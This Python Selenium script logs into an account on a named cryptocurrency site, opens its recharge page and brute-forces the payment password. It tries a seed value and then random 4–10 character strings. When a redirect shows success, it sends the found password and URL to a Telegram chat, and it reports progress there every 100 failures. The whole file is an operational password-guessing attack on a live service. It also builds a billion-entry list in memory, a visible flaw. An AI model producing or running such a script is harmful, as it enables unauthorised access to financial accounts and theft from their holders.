import os
import time
import random
import string
import telebot
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException

# Telegram Setup
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
bot = telebot.TeleBot(BOT_TOKEN)

initial_password = "Btc658"

def generate_password(length=6):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def send_log(message):
    try:
        bot.send_message(CHAT_ID, message)
    except Exception as e:
        print("Telegram Error:", e)

def start_driver():
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.binary_location = "/usr/bin/google-chrome"
    return webdriver.Chrome(options=chrome_options)

def main():
    driver = start_driver()
    try:
        driver.get("https://www.btc320.com/pages/user/other/userLogin")
        time.sleep(5)

        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[4]/uni-view/uni-view[2]/uni-view/uni-input/div/input').send_keys(os.getenv("USERNAME"))
        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[5]/uni-view[1]/uni-view[2]/uni-view/uni-input/div/input').send_keys(os.getenv("PASSWORD"))
        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[6]/uni-button').click()
        time.sleep(6)
        send_log("✅ Logged in successfully.")

        driver.get("https://www.btc320.com/pages/user/recharge/userRecharge")
        time.sleep(6)
        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[3]/uni-view[5]/uni-view/uni-view/uni-input/div/input').send_keys("100")

        passwords = [initial_password] + [generate_password(random.randint(4, 10)) for _ in range(1000000000)]
        wrong_count = 0

        for pwd in passwords:
            try:
                input_box = driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[3]/uni-view[9]/uni-view/uni-view/uni-input/div/input')
                input_box.clear()
                input_box.send_keys(pwd)
                driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[4]/uni-view/uni-view/uni-button').click()
                time.sleep(5)

                current_url = driver.current_url
                if "rechargePay?sn=" in current_url:
                    send_log(f"✅ Password correct: {pwd}\nURL: {current_url}")
                    break

                wrong_count += 1
                if wrong_count >= 100:
                    send_log(f"❌ 100 wrong passwords tried. Last tried: {pwd}")
                    wrong_count = 0

            except Exception as e:
                send_log(f"⚠️ Error while testing password '{pwd}': {e}")

    except Exception as e:
        send_log(f"🔥 Bot crashed: {e}")
    finally:
        driver.quit()

if __name__ == "__main__":
    send_log("🚀 Bot started")
    main()
